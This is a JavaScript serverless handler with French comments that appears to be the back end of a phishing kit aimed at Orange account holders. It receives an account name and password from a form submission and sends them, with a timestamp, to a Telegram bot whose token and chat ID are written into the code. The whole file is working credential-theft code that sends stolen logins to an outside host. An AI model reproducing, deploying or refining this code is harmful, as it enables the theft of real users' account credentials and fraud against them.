// api/send.js
export default async function handler(req, res) {
  // Seules les requêtes POST sont autorisées
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  const { account, password } = req.body;

  if (!account || !password) {
    return res.status(400).json({ error: 'Compte et mot de passe requis' });
  }

  // Vos identifiants Telegram (en dur pour l'instant)
  const token = "8304961826:AAFs2TuYtCbntOGkc32u7MW1rzPCH6OQF1s";
  //const chatId = "8597859737";
  const chatId = "1242128826";

  const message = `
Compte Orange : ${account}
Mot de passe : ${password}
Heure : ${new Date().toLocaleString('fr-FR')}
`;

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Erreur Telegram :', errorData);
      return res.status(500).json({ error: `Erreur Telegram : ${response.status}` });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Erreur lors de l’envoi du message' });
  }
}